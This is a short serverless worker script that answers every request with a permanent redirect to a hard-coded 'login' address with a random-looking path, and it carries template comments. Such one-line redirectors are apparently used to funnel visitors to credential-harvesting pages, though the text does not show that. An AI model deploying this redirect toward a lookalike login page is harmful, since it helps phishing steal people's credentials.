addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const redirectUrl = "https://login.leasmasters.nl/hsrdNGMH" // Replace with your target URL

  return Response.redirect(redirectUrl, 301) // 301 for permanent, use 302 for temporary
}
